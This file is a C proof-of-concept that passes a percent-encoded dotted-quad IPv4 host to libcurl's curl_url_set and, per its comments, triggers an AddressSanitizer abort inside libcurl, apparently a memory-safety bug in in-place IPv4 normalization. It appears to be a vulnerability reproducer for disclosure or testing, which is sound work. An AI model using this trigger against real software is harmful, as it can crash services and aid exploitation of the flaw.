/* PoC: curl_url_set(CURLUPART_HOST) with a percent-encoded dotted-quad
 * IPv4 address. The URL API decodes the part for validation; the decoded
 * form is a canonical dotted-quad that the IPv4 normalizer rewrites in
 * place.
 *
 * Fire = AddressSanitizer abort inside libcurl during curl_url_set().
 */
#include <curl/curl.h>
#include <stdio.h>

int main(void)
{
  CURLU *u = curl_url();
  CURLUcode uc;
  char *host = NULL;

  if(!u)
    return 2;

  /* decodes to "255.255.255.255" (already canonical dotted decimal) */
  uc = curl_url_set(u, CURLUPART_HOST,
                    "%32%35%35.%32%35%35.%32%35%35.%32%35%35", 0);
  printf("set: %d\n", (int)uc);
  if(!uc) {
    uc = curl_url_get(u, CURLUPART_HOST, &host, 0);
    printf("get: %d host: %s\n", (int)uc, host ? host : "(null)");
    curl_free(host);
  }
  curl_url_cleanup(u);
  return 0;
}
